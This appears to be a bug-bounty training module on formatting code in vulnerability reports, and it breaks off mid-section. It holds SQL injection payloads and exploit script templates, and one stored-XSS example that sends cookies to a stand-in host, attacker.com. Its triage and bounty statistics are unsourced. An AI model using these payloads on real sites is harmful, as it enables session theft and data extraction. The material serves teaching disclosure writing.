# Code Sample Formatting in Bug Bounty Reports

## Expert Role

Code sample formatting is the art of presenting technical evidence clearly, professionally, and accessibly in security reports. Well-formatted code blocks demonstrate vulnerabilities precisely, enable reproducibility, and establish researcher credibility through attention to detail. This module covers the complete spectrum of code presentation for security reports, from simple curl commands to complex exploit scripts, with emphasis on clarity, syntax highlighting, and professional presentation.

The quality of your code presentation directly impacts report validation. Triagers who can quickly understand your code examples validate reports faster and with fewer questions. Code that is well-formatted, properly highlighted, and logically organized demonstrates professionalism and increases report acceptance rates. In 2026, code presentation is a core skill for security researchers.

Effective code formatting goes beyond syntax highlighting. It involves selecting the right code samples, providing appropriate context, using consistent formatting, and integrating code seamlessly into your narrative. This module teaches you to present code that is both technically accurate and visually compelling.

## Core Concepts

### Code Block Standards

**Essential Elements**:

```
Code Block Components:
1. Language specification (for syntax highlighting)
2. Appropriate indentation
3. Meaningful comments
4. Clear variable names
5. Logical organization
6. Consistent style
7. Context indicators
8. Line numbers (when helpful)
```

**Markdown Code Block Syntax**:

```markdown
# Inline Code
`variable_name`

# Code Block (no language)
```
code here
```

# Code Block (with language)
```python
def vulnerable_function():
    pass
```
```

### Language Selection Matrix

| Vulnerability Type | Primary Language | Secondary Language | Example Focus |
|-------------------|-----------------|-------------------|---------------|
| SQL Injection | SQL | Language-specific | Query construction |
| XSS | JavaScript | HTML | Payload execution |
| SSRF | Python | curl | Request construction |
| CSRF | JavaScript | HTML | Token manipulation |
| Auth Bypass | Language of app | curl | Token forgery |
| Path Traversal | Python | bash | Path manipulation |
| Command Injection | Language of app | bash | Command construction |
| Deserialization | Language of app | Python | Object manipulation |

### Code Sample Types

**Request/Response Pairs**:

```
Purpose: Show exact HTTP interactions
Components: Method, headers, body, response
Audience: All technical readers
Complexity: Low to moderate
```

**Exploit Scripts**:

```
Purpose: Demonstrate complete exploitation
Components: Setup, execution, output
Audience: Technical triagers
Complexity: Moderate to high
```

**Proof of Concept Code**:

```
Purpose: Show vulnerability mechanism
Components: Vulnerable code, exploit code, fixed code
Audience: Developers and security engineers
Complexity: Variable
```

**Configuration Snippets**:

```
Purpose: Show vulnerable configurations
Components: Before/after, specific settings
Audience: System administrators
Complexity: Low to moderate
```

### Syntax Highlighting Principles

**Highlighting Standards**:

```
Highlighting Elements:
- Keywords: Distinct color (blue, purple)
- Strings: Different color (green, orange)
- Comments: Gray or italic
- Functions: Bold or distinct color
- Variables: Standard color
- Numbers: Distinct color
- Operators: Standard or distinct
- Errors: Red highlighting
```

**Language-Specific Considerations**:

```
Python:
- def, class, import: Keywords
- Strings: Green or orange
- Comments: Gray
- Functions: Bold

JavaScript:
- function, var, let, const: Keywords
- Strings: Green
- Comments: Gray
- Methods: Bold

SQL:
- SELECT, WHERE, FROM: Keywords (uppercase)
- Strings: Green
- Table/Column names: Standard
- Operators: Distinct
```

### Context Indicators

**Code Context Labels**:

```
Context Types:
- BEFORE: Vulnerable code
- AFTER: Fixed code
- EXPLOIT: Exploitation code
- REQUEST: HTTP request
- RESPONSE: HTTP response
- OUTPUT: Command output
- CONFIGURATION: Config file
```

**Context Formatting**:

```markdown
**Vulnerable Code (Python):**
```python
# Vulnerable code here
```

**Fixed Code (Python):**
```python
# Fixed code here
```
```

### Request/Response Formatting

**HTTP Request Format**:

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

{
    "username": "admin",
    "password": "password123"
}
```

**HTTP Response Format**:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=abc123; Path=/

{
    "status": "success",
    "token": "eyJhbGciOiJIUzI1NiJ9...",
    "user": {
        "id": 123,
        "role": "admin"
    }
}
```

**curl Command Format**:

```bash
# Basic curl command
curl -X POST 'https://target.com/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"password123"}'

# With authentication
curl -X GET 'https://target.com/api/users' \
  -H 'Authorization: Bearer TOKEN'

# Verbose output
curl -v -X POST 'https://target.com/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"password123"}' \
  2>&1 | tee response.txt
```

### Exploit Code Formatting

**Python Exploit Template**:

```python
#!/usr/bin/env python3
"""
Exploit: [Vulnerability Type]
Target: [Target URL]
Date: [Discovery Date]
Researcher: [Your Name]
"""

import requests
import sys
from datetime import datetime

class Exploit:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def exploit(self):
        """Main exploitation logic"""
        # Exploitation code here
        pass
    
    def verify(self):
        """Verify exploitation success"""
        # Verification code here
        pass
    
    def run(self):
        """Execute complete exploit"""
        print(f"[*] Target: {self.target}")
        print(f"[*] Date: {datetime.now().isoformat()}")
        
        if self.exploit():
            self.verify()
            print("[+] Exploitation successful")
        else:
            print("[-] Exploitation failed")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
    exploit = Exploit(target)
    exploit.run()
```

**curl Exploit Template**:

```bash
#!/bin/bash
# Exploit: [Vulnerability Type]
# Target: [Target URL]
# Date: [Discovery Date]

TARGET="${1:-https://target.com}"

echo "[*] Target: $TARGET"
echo "[*] Date: $(date -Iseconds)"

# Step 1: [Description]
echo "[*] Step 1: [Description]"
curl -s -o /dev/null -w "%{http_code}" \
  "$TARGET/api/vulnerable" \
  -d "payload=test"

# Step 2: [Description]
echo "[*] Step 2: [Description]"
RESPONSE=$(curl -s "$TARGET/api/vulnerable" \
  -d "payload=exploit")

if echo "$RESPONSE" | grep -q "success"; then
    echo "[+] Exploitation successful"
else
    echo "[-] Exploitation failed"
fi
```

### Code Comment Standards

**Comment Guidelines**:

```
Comment Types:
1. Purpose: What the code does
2. Security: Security implications
3. Context: Why this approach
4. Warning: Potential issues
5. Note: Important details

Comment Style:
- Brief and clear
- Focus on security
- Explain non-obvious logic
- Reference documentation
- Include timestamps
```

**Example Comments**:

```python
# Vulnerable: SQL injection via string concatenation
query = f"SELECT * FROM users WHERE id = {user_id}"

# Fixed: Parameterized query prevents SQL injection
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))

# Note: This endpoint has no rate limiting
# Warning: Exploitation requires valid session
# See: https://owasp.org/www-community/attacks/SQL_Injection
```

### Line Number Usage

**When to Use Line Numbers**:

```
Use Line Numbers When:
- Referencing specific lines in explanation
- Code is long (20+ lines)
- Multiple code blocks relate to each other
- Debugging or analysis context
- Code review context

Avoid Line Numbers When:
- Code is short (< 10 lines)
- Simple examples
- Configuration snippets
- Command output
- Inline code
```

**Line Number Formatting**:

```python
# Without line numbers (simple code)
def vulnerable():
    return db.query(f"SELECT * FROM users WHERE id = {id}")

# With line numbers (complex code)
# 1: def complex_function(user_input):
# 2:     """Process user input with multiple vulnerabilities"""
# 3:     # SQL injection vulnerability
# 4:     query = f"SELECT * FROM users WHERE name = '{user_input}'"
# 5:     result = db.execute(query)
# 6:     
# 7:     # XSS vulnerability
# 8:     output = f"<div>{user_input}</div>"
# 9:     
# 10:    return {"data": result, "html": output}
```

### Code Size Guidelines

**Appropriate Code Block Sizes**:

```
Small (1-5 lines):
- Individual function calls
- Simple commands
- Configuration lines
- Single vulnerability examples

Medium (6-20 lines):
- Complete functions
- Request/response pairs
- Simple exploit scripts
- Configuration blocks

Large (21-50 lines):
- Complex functions
- Complete exploit scripts
- Multiple request sequences
- Detailed analysis code

Extra Large (50+ lines):
- Complete programs
- Comprehensive analysis
- Reference implementations
- Appendix material
```

### Diff Presentation

**Before/After Code Comparison**:

```python
# BEFORE: Vulnerable Code
def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    return db.execute(query)

# AFTER: Fixed Code
def get_user(user_id):
    query = "SELECT * FROM users WHERE id = %s"
    return db.execute(query, (user_id,))
```

**Side-by-Side Comparison**:

```python
# Vulnerable                              # Fixed
query = f"SELECT * FROM users             query = "SELECT * FROM users
         WHERE id = {user_id}"                    WHERE id = %s"
db.execute(query)                         db.execute(query, (user_id,))
```

### Error Handling in Code

**Robust Exploit Code**:

```python
def safe_exploit(url):
    """Exploit with proper error handling"""
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except requests.exceptions.HTTPError as e:
        print(f"[-] HTTP error: {e}")
        return None
    except json.JSONDecodeError:
        print("[-] Invalid JSON response")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None
```

## Prerequisites

### Technical Prerequisites

1. **Markdown proficiency**: Code block syntax
2. **Syntax highlighting**: Language-specific formatting
3. **HTTP knowledge**: Request/response formatting
4. **Programming skills**: Multiple languages
5. **Command line**: Shell script formatting
6. **Version control**: Code versioning
7. **Documentation skills**: Technical writing
8. **Attention to detail**: Formatting accuracy

### Tool Prerequisites

1. **Code editors**: VS Code, IntelliJ, PyCharm
2. **Markdown editors**: Typora, Obsidian
3. **Code formatters**: Prettier, Black, PEP 8
4. **Syntax highlighters**: highlight.js, Prism.js
5. **Code screenshot tools**: Carbon, Ray.so
6. **Terminal emulators**: For command formatting
7. **Documentation generators**: Sphinx, MkDocs
8. **Version control**: Git for code management

### Knowledge Prerequisites

1. **Code style guides**: PEP 8, Airbnb JavaScript Style Guide
2. **Security patterns**: Vulnerable vs secure code
3. **HTTP standards**: Request/response formatting
4. **Markdown standards**: GFM specification
5. **Accessibility**: Readable code presentation
6. **Best practices**: Industry conventions
7. **Tool capabilities**: Formatting options
8. **Platform requirements**: Submission standards

## Methodology

### Phase 1: Code Selection

#### Step 1: Identify Essential Code Samples

Determine what code to include:

```
Code Selection Framework:
1. What demonstrates the vulnerability?
2. What enables reproduction?
3. What shows the fix?
4. What provides context?
5. What establishes credibility?
```

**Code Selection Matrix**:

| Vulnerability | Essential Code | Optional Code | Appendix Code |
|---------------|----------------|---------------|---------------|
| SQLi | Vulnerable query, Fix | Exploit script | Full database analysis |
| XSS | Vulnerable output, Payload | Exploit script | Complete payload list |
| SSRF | Vulnerable request, Fix | Exploit script | Network mapping |
| CSRF | Vulnerable action, Token | Exploit HTML | Complete PoC page |
| Auth Bypass | Vulnerable auth, Exploit | Fix code | Complete bypass chain |

#### Step 2: Determine Code Format

Choose appropriate formatting:

```
Format Decision Tree:
Is it a command? → curl/bash format
Is it a request? → HTTP format
Is it a function? → Language-specific format
Is it a config? → Config file format
Is it output? → Plain text format
```

#### Step 3: Plan Code Organization

Structure code presentation:

```
Organization Plan:
1. Simple example first
2. Complex example second
3. Fix example third
4. Reference material last

Sequence:
1. Basic vulnerability demonstration
2. Complete exploitation chain
3. Remediation implementation
4. Additional context
```

### Phase 2: Code Preparation

#### Step 4: Clean and Simplify

Prepare code for presentation:

```
Code Cleaning Process:
1. Remove unnecessary lines
2. Simplify complex logic
3. Add meaningful comments
4. Use consistent naming
5. Format consistently
6. Add context labels
```

**Cleaning Example**:

```python
# Before: Messy code
def x(a):
    import requests
    import json
    r=requests.get('https://target.com/api/'+a)
    d=json.loads(r.text)
    return d['data']

# After: Clean code
def get_user_data(user_id):
    """Fetch user data by ID - vulnerable to IDOR"""
    response = requests.get(
        f"https://target.com/api/users/{user_id}"
    )
    data = response.json()
    return data['data']
```

#### Step 5: Add Context and Comments

Enhance understanding:

```
Context Addition:
1. Function/module purpose
2. Security implications
3. Vulnerability explanation
4. Fix rationale
5. Usage instructions
6. Warnings and notes
```

**Context Example**:

```python
# Vulnerable: Direct string interpolation in SQL query
# Impact: SQL injection allowing data extraction
# Fix: Use parameterized queries
def get_user(username):
    """
    Retrieve user by username.
    
    WARNING: This function is vulnerable to SQL injection
    when username contains malicious SQL.
    
    See: https://owasp.org/www-community/attacks/SQL_Injection
    """
    # VULNERABLE: String concatenation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    
    # FIXED: Parameterized query
    # query = "SELECT * FROM users WHERE username = %s"
    # cursor.execute(query, (username,))
    
    return db.execute(query)
```

#### Step 6: Format Consistently

Apply uniform formatting:

```
Formatting Standards:
1. Consistent indentation (4 spaces Python, 2 spaces JS)
2. Consistent naming conventions
3. Consistent comment style
4. Consistent spacing
5. Consistent line length
6. Consistent error handling
```

### Phase 3: Code Presentation

#### Step 7: Create Code Blocks

Format for reports:

```
Code Block Creation:
1. Choose language for syntax highlighting
2. Add language identifier
3. Format code block
4. Add context labels
5. Include comments
6. Verify rendering
```

**Markdown Code Block**:

```markdown
**Vulnerable Code (Python):**
```python
def vulnerable_function(user_input):
    # SQL injection vulnerability
    query = f"SELECT * FROM users WHERE name = '{user_input}'"
    return db.execute(query)
```

**Fixed Code (Python):**
```python
def secure_function(user_input):
    # Parameterized query prevents SQL injection
    query = "SELECT * FROM users WHERE name = %s"
    return db.execute(query, (user_input,))
```
```

#### Step 8: Create Request/Response Pairs

Format HTTP interactions:

```
Request/Response Format:
1. Complete request (method, URL, headers, body)
2. Complete response (status, headers, body)
3. Annotations highlighting key elements
4. Context for both request and response
```

**HTTP Format**:

```http
POST /api/search HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
User-Agent: Mozilla/5.0

{
    "query": "test' OR 1=1--",
    "category": "users"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Powered-By: Express

{
    "status": "success",
    "results": [
        {"id": 1, "name": "admin", "email": "admin@target.com"},
        {"id": 2, "name": "user1", "email": "user1@target.com"}
    ],
    "count": 2
}
```

#### Step 9: Create curl Commands

Format command-line examples:

```
curl Format:
1. Complete command with options
2. Comments explaining each part
3. Output capture when relevant
4. Alternative approaches
```

**curl Examples**:

```bash
# Basic SQL injection test
curl -X POST 'https://target.com/api/search' \
  -H 'Content-Type: application/json' \
  -d '{"query": "test'\'' OR 1=1--"}' \
  | jq .

# With authentication
curl -X GET 'https://target.com/api/users' \
  -H 'Authorization: Bearer TOKEN' \
  -H 'Accept: application/json' \
  | jq '.users[]'

# Verbose mode for debugging
curl -v -X POST 'https://target.com/api/search' \
  -H 'Content-Type: application/json' \
  -d '{"query": "test'\'' OR 1=1--"}' \
  2>&1 | tee debug_output.txt
```

#### Step 10: Create Exploit Scripts

Format complete exploitation code:

```
Exploit Script Format:
1. Header with metadata
2. Imports and setup
3. Main exploitation logic
4. Verification function
5. Execution entry point
6. Error handling
```

**Exploit Script Example**:

```python
#!/usr/bin/env python3
"""
Exploit: SQL Injection in Search Function
Target: https://target.com
Date: 2026-01-15
Researcher: Security Researcher
"""

import requests
import argparse
from urllib.parse import urljoin

def exploit(target, payload):
    """Execute SQL injection payload"""
    url = urljoin(target, '/api/search')
    
    try:
        response = requests.post(
            url,
            json={"query": payload},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Exploit')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--payload', default="' OR 1=1--", 
                       help='SQL payload')
    
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {args.payload}")
    
    result = exploit(args.target, args.payload)
    
    if result and 'results' in result:
        print(f"[+] Success! Found {len(result['results'])} records")
        for record in result['results']:
            print(f"    - {record.get('name', 'N/A')}")
    else:
        print("[-] Exploitation failed")

if __name__ == "__main__":
    main()
```

### Phase 4: Code Integration

#### Step 11: Integrate Code into Narrative

Connect code to explanation:

```
Integration Process:
1. Reference code in text
2. Explain code purpose
3. Highlight key sections
4. Connect to impact
5. Link to fix
```

**Integration Example**:

```
The vulnerability exists in the search functionality. When user
input is directly concatenated into a SQL query:

```python
query = f"SELECT * FROM users WHERE name = '{user_input}'"
```

An attacker can inject SQL syntax to extract arbitrary data.
The following curl command demonstrates the exploitation:

```bash
curl -X POST 'https://target.com/api/search' \
  -d '{"query": "admin'\'' OR 1=1--"}'
```

This returns all user records, including sensitive data.
The fix uses parameterized queries:

```python
query = "SELECT * FROM users WHERE name = %s"
cursor.execute(query, (user_input,))
```
```

#### Step 12: Create Code Documentation

Document code thoroughly:

```
Documentation Elements:
1. Purpose statement
2. Input/output description
3. Security implications
4. Usage examples
5. Limitations
6. References
```

**Code Documentation Example**:

```python
def extract_data(target_url, session_id):
    """
    Extract sensitive data via SQL injection.
    
    Args:
        target_url: Base URL of target application
        session_id: Valid session identifier
    
    Returns:
        dict: Extracted data or None on failure
    
    Security Implications:
        - This function exploits SQL injection vulnerability
        - Can extract arbitrary database contents
        - Requires valid session for authentication
    
    Usage:
        data = extract_data("https://target.com", "abc123")
    
    Limitations:
        - Only works with MySQL/MariaDB databases
        - Rate limited to 10 requests per second
        - Maximum 1000 records per extraction
    """
    # Implementation here
    pass
```

### Phase 5: Advanced Techniques

#### Step 13: Create Code Comparison Visuals

Show before/after effectively:

```
Comparison Techniques:
1. Side-by-side code blocks
2. Diff-style presentation
3. Sequential code blocks
4. Color-coded differences
5. Annotation overlays
```

**Diff Presentation**:

```python
# BEFORE (Vulnerable)
- def get_user(user_id):
-     query = f"SELECT * FROM users WHERE id = {user_id}"
-     return db.execute(query)

# AFTER (Fixed)
+ def get_user(user_id):
+     query = "SELECT * FROM users WHERE id = %s"
+     return db.execute(query, (user_id,))
```

#### Step 14: Create Interactive Code Examples

Make code explorable:

```
Interactive Techniques:
1. Code playgrounds (JSFiddle, CodePen)
2. Collapsible code sections
3. Tabbed code views
4. Live execution environments
5. Shared code repositories
```

#### Step 15: Create Code Reference Material

Provide comprehensive reference:

```
Reference Material:
1. Complete exploit code
2. All payload variations
3. Configuration files
4. Testing scripts
5. Automation tools
```

**Reference Code Block**:

```markdown
## Complete Exploit Code

The complete exploit is available at:
- GitHub: [link to repository]
- Gist: [link to gist]

Key components:
1. `exploit.py` - Main exploitation script
2. `config.py` - Configuration settings
3. `payloads.txt` - Payload list
4. `README.md` - Usage instructions
```

## Tool Arsenal

### Code Formatting Tools

```
Code Editors:
- VS Code: Extensions for formatting
- IntelliJ IDEA: Built-in formatting
- PyCharm: Python-specific formatting
- Sublime Text: Lightweight editing
- Atom: Customizable formatting

Formatters:
- Prettier: JavaScript/TypeScript formatting
- Black: Python formatting
- gofmt: Go formatting
- rustfmt: Rust formatting
- clang-format: C/C++ formatting

Linters:
- ESLint: JavaScript linting
- Pylint: Python linting
- ShellCheck: Shell script linting
- RuboCop: Ruby linting
- golangci-lint: Go linting
```

### Syntax Highlighting Tools

```
Highlighters:
- highlight.js: Browser-based highlighting
- Prism.js: Lightweight highlighting
- Pygments: Python-based highlighting
- Rouge: Ruby-based highlighting
- SHJS: Shell highlighting

Code Screenshots:
- Carbon: Beautiful code images
- Ray.so: Code visualization
- CodeScreenshot: VS Code extension
- Polacode: VS Code extension
- Codeimg: Code to image

Theme Resources:
- GitHub Themes: Color schemes
- Solarized: Color palette
- Monokai: Popular theme
- Dracula: Dark theme
- One Dark: Atom theme
```

### Documentation Tools

```
Documentation Generators:
- Sphinx: Python documentation
- JSDoc: JavaScript documentation
- Doxygen: C/C++ documentation
- Rustdoc: Rust documentation
- GoDoc: Go documentation

Markdown Processors:
- CommonMark: Standard Markdown
- GitHub Flavored Markdown
- MultiMarkdown: Extended Markdown
- Pandoc: Document conversion
- mdBook: Rust-based documentation
```

### Code Analysis Tools

```
Static Analysis:
- SonarQube: Code quality analysis
- CodeClimate: Automated review
- DeepSource: Static analysis
- LGTM: Code analysis
- Semgrep: Pattern-based analysis

Security Analysis:
- Bandit: Python security linter
- ESLint Security: JavaScript security
- Brakeman: Rails security
- Gosec: Go security
- Safety: Python dependency checking
```

## Case Studies

### Case Study 1: SQL Injection Code Presentation

**Vulnerability**: SQL injection in login form

**Code Presentation Approach**: Sequential code blocks with context

**Code Sequence**:

```python
# Step 1: Vulnerable Code
# The vulnerability exists in the login function
def login(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    return db.execute(query)

# Step 2: Exploitation
# Using the following payload in the username field:
# ' OR 1=1--

# Step 3: curl Command
# ```bash
# curl -X POST 'https://target.com/login' \
#   -d "username=' OR 1=1--&password=anything"
# ```

# Step 4: Fixed Code
# The fix uses parameterized queries
def secure_login(username, password):
    query = "SELECT * FROM users WHERE username = %s AND password = %s"
    return db.execute(query, (username, password))
```

**Result**: Report accepted as Critical, $25,000 bounty

**Key Takeaways**:
- Sequential code tells complete story
- Context comments explain significance
- Multiple code types serve different audiences
- Fix code demonstrates remediation

### Case Study 2: XSS Exploit Script

**Vulnerability**: Stored XSS in user profile

**Code Presentation**: Complete exploit script with documentation

**Exploit Script**:

```python
#!/usr/bin/env python3
"""
XSS Exploit for Profile Field
Demonstrates stored XSS vulnerability
"""

import requests

def exploit_xss(target_url, session_cookie):
    """Exploit stored XSS in profile"""
    
    # Step 1: Inject XSS payload
    payload = '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'
    
    # Step 2: Update profile with payload
    response = requests.post(
        f"{target_url}/api/profile",
        json={"bio": payload},
        cookies={"session": session_cookie}
    )
    
    # Step 3: Verify injection
    profile = requests.get(
        f"{target_url}/profile",
        cookies={"session": session_cookie}
    )
    
    if payload in profile.text:
        print("[+] XSS payload injected successfully")
        return True
    
    return False

if __name__ == "__main__":
    exploit_xss("https://target.com", "your_session_cookie")
```

**Result**: Report accepted as High, $5,000 bounty

**Key Takeaways**:
- Complete exploit demonstrates real impact
- Documentation explains attack flow
- Error handling shows professionalism
- Usage instructions aid reproduction

### Case Study 3: SSRF Configuration Fix

**Vulnerability**: SSRF in URL preview functionality

**Code Presentation**: Before/after configuration with explanation

**Configuration Presentation**:

```yaml
# BEFORE: Vulnerable Configuration
url_preview:
  allowed_schemes:
    - http
    - https
    - file
    - ftp
  timeout: 30s
  follow_redirects: true

# AFTER: Fixed Configuration
url_preview:
  allowed_schemes:
    - http
    - https
  blocked_ips:
    - 127.0.0.0/8
    - 10.0.0.0/8
    - 172.16.0.0/12
    - 192.168.0.0/16
    - 169.254.169.254
  blocked_domains:
    - localhost
    - *.internal
    - *.local
  timeout: 5s
  max_response_size: 1MB
  follow_redirects: false
```

**Result**: Report accepted as High, $8,000 bounty

**Key Takeaways**:
- Configuration code is immediately actionable
- Before/after comparison shows improvement
- Specific settings provide implementation guidance
- Security rationale explains decisions

## Advanced Topics

### Advanced Code Presentation

**Code Animation**:

```
Technique: Create animated GIFs of code execution
Purpose: Show dynamic exploitation process
Tools: Terminal recording, GIF creation
Benefits: Visual demonstration of execution flow
```

**Interactive Code**:

```
Technique: Create interactive code examples
Purpose: Allow hands-on exploration
Tools: JSFiddle, CodePen, repl.it
Benefits: Enhanced understanding, engagement
```

**Code Visualization**:

```
Technique: Visualize code execution flow
Purpose: Show program execution path
Tools: Python Tutor, debugger visualizations
Benefits: Clear execution understanding
```

### Code Documentation Best Practices

**Comprehensive Documentation**:

```python
"""
Module: sql_injection_exploit.py
Purpose: Demonstrate SQL injection vulnerability
Author: Security Researcher
Date: 2026-01-15
Version: 1.0

Description:
    This script demonstrates SQL injection vulnerability
    in the target application's search functionality.

Usage:
    python sql_injection_exploit.py https://target.com

Requirements:
    - requests library
    - Valid session token

Security Implications:
    - Allows unauthorized data access
    - Can extract complete database
    - Bypasses authentication

References:
    - CWE-89: SQL Injection
    - OWASP: SQL Injection Prevention
"""
```

### Code Quality Metrics

**Quality Indicators**:

```
Code Quality Checklist:
- Clear variable names
- Consistent formatting
- Meaningful comments
- Error handling
- Input validation
- Security considerations
- Documentation
- Readability
```

**Quality Scoring**:

```
Excellent (5/5):
- Professional formatting
- Comprehensive comments
- Complete error handling
- Security best practices
- Clear documentation

Good (4/5):
- Clean formatting
- Adequate comments
- Basic error handling
- Security awareness
- Basic documentation

Average (3/5):
- Acceptable formatting
- Some comments
- Limited error handling
- Basic security
- Minimal documentation
```

## Detection

### Code Quality Detection

**Strong Code Presentation Indicators**:
- Syntax highlighting works
- Code is properly indented
- Comments explain key points
- Context is clear
- Reproduction is easy
- Professional appearance

**Improvement Areas**:
- Missing syntax highlighting
- Inconsistent indentation
- Unclear comments
- Missing context
- Difficult reproduction
- Unprofessional appearance

### Code Effectiveness Detection

**Effective Code Indicators**:
- Triager reproduces immediately
- No code-related questions
- Positive feedback
- Fast validation
- Appropriate bounty

**Ineffective Code Indicators**:
- Reproduction difficulties
- Code-related questions
- Requests for clarification
- Delayed validation
- Lower bounty

## Impact

### Code Quality Impact on Triage

| Code Quality | Triage Speed | Acceptance Rate |
|--------------|--------------|-----------------|
| Poor | 5-7 days | 60% |
| Average | 3-5 days | 75% |
| Good | 1-3 days | 85% |
| Excellent | < 24 hours | 95% |

### Code Quality Impact on Bounty

| Code Quality | Bounty Multiplier |
|--------------|-------------------|
| Poor | 0.7x |
| Average | 0.9x |
| Good | 1.0x |
| Excellent | 1.3x |

## Pitfalls

### Common Code Formatting Mistakes

1. **Missing syntax highlighting**: Plain text code
2. **Inconsistent indentation**: Mixed styles
3. **Missing comments**: Unclear code purpose
4. **No context**: Code without explanation
5. **Incomplete examples**: Partial code
6. **Poor formatting**: Hard to read
7. **Missing error handling**: Fragile code
8. **No documentation**: Missing usage info
9. **Wrong language**: Incorrect highlighting
10. **Too much code**: Overwhelming examples
11. **Too little code**: Insufficient evidence
12. **No fix code**: Missing remediation
13. **Hardcoded values**: Non-reproducible
14. **Missing output**: No execution results
15. **Poor naming**: Unclear variables

### Recovery from Code Issues

**If Code is Rejected**:
1. Request specific feedback
2. Improve formatting
3. Add missing context
4. Provide additional examples
5. Resubmit with improvements

**If Code is Unclear**:
1. Add more comments
2. Simplify examples
3. Provide alternative formats
4. Include usage instructions
5. Offer live demonstration

### Continuous Improvement

**Skill Development Framework**:
1. Study successful code presentations
2. Practice with different languages
3. Seek feedback regularly
4. Analyze triager responses
5. Refine techniques continuously
6. Track improvement metrics

## Integration

### Report Integration

**Code Integration Strategy**:

```
Report Structure:
1. Executive Summary (no code)
2. Technical Summary (key code)
3. Detailed Analysis (complete code)
4. Impact Analysis (impact code)
5. Remediation (fix code)
6. Appendix (reference code)
```

**Integration Points**:
- Reference code in narrative
- Connect code to impact
- Link code to fix
- Cross-reference related code

### Workflow Integration

**Code Presentation Workflow**:

```
Selection → Preparation → Formatting → Integration → Review
    ↓           ↓             ↓              ↓           ↓
 Choose      Clean and     Format for    Include in   Verify
  Code       Simplify      Report        Report       Quality
```

### Tool Integration

**Integrated Code Environment**:

```
Code Editor → Formatter → Documentation → Report
    ↓            ↓              ↓            ↓
 Write       Format and     Document     Integrate
  Code       Highlight      Code         Code
```

### Team Integration

**Collaborative Code Development**:

```
Researcher → Reviewer → Editor → Finalizer
    ↓           ↓          ↓          ↓
 Write      Validate    Polish    Integrate
 Code       Code        Code      Code
```

## Reporting

### Code Documentation Standards

**Required Elements**:

```
Documentation Checklist:
- Language specification
- Proper indentation
- Meaningful comments
- Context labels
- Before/after comparison
- Error handling
- Usage instructions
- References
```

**Enhanced Documentation**:

```
Optional but Valuable:
- Complete exploit script
- Multiple language versions
- Configuration examples
- Testing scripts
- Automation tools
- Reference material
```

### Code Templates

**Standard Code Block Template**:

```markdown
**[Context] ([Language]):**
```[language]
[Code here with comments]
```

**Explanation**: [What this code does and why it matters]
```

**Exploit Script Template**:

```markdown
## Exploit Script

**[Script Name] ([Language]):**
```[language]
[Complete exploit code with documentation]
```

**Usage**: [How to run the script]
**Requirements**: [Dependencies]
**Output**: [Expected output]
```

### Communication Templates

**Code Presentation Communication**:

```
Subject: Code Examples for Report #[ID]

Hi [Program Manager],

I've included comprehensive code examples in my report:

Code Examples:
- Vulnerable code with explanation
- Complete exploit script
- curl commands for reproduction
- Fixed code with implementation guidance

All code is properly formatted with syntax highlighting,
comments, and documentation for easy understanding.

Best regards,
[Your Name]
```

## Labs

### Lab 1: Code Formatting Workshop

**Objective**: Format code samples for reports

**Duration**: 2 hours

**Task**:
1. Select 3 different vulnerabilities
2. Create code examples for each
3. Format with syntax highlighting
4. Add comments and context
5. Peer review (if possible)

**Deliverables**:
- 9 code blocks (3 vulns x 3 types)
- Proper syntax highlighting
- Meaningful comments
- Clear context

**Success Criteria**:
- Code is properly formatted
- Comments explain key points
- Context is clear
- Reproduction is easy

### Lab 2: Exploit Script Development

**Objective**: Create complete exploit scripts

**Duration**: 3 hours

**Task**:
1. Select complex vulnerability
2. Develop complete exploit script
3. Add documentation
4. Include error handling
5. Test execution

**Deliverables**:
- Complete exploit script
- Documentation
- Error handling
- Usage instructions

**Success Criteria**:
- Script executes successfully
- Documentation complete
- Error handling robust
- Usage clear

### Lab 3: Request/Response Documentation

**Objective**: Document HTTP interactions

**Duration**: 2 hours

**Task**:
1. Capture request/response pairs
2. Format in HTTP format
3. Add annotations
4. Create curl commands
5. Include in report

**Deliverables**:
- Formatted request/response
- Annotated HTTP pairs
- curl commands
- Report integration

**Success Criteria**:
- HTTP format correct
- Annotations helpful
- curl commands work
- Integration seamless

### Lab 4: Code Comparison Workshop

**Objective**: Create effective before/after comparisons

**Duration**: 2 hours

**Task**:
1. Select vulnerable code
2. Create fixed version
3. Format comparison
4. Add explanation
5. Integrate into report

**Deliverables**:
- Before/after comparison
- Diff presentation
- Explanation
- Report integration

**Success Criteria**:
- Comparison clear
- Diff format effective
- Explanation complete
- Integration seamless

## Ethics

### Ethical Code Presentation Principles

**Accuracy Principles**:

1. **Truthful representation**: Code accurately shows vulnerability
2. **No manipulation**: Don't alter code to misrepresent
3. **Complete context**: Show full picture
4. **Honest comments**: Accurate explanations
5. **Professional integrity**: Maintain honesty

**Responsible Disclosure**:

1. **Minimal exposure**: Show only necessary code
2. **Responsible sharing**: Consider implications
3. **Access controls**: Protect sensitive code
4. **Time limits**: Remove public code after disclosure
5. **Scope compliance**: Stay within boundaries

### Ethical Considerations

**Avoiding Misrepresentation**:

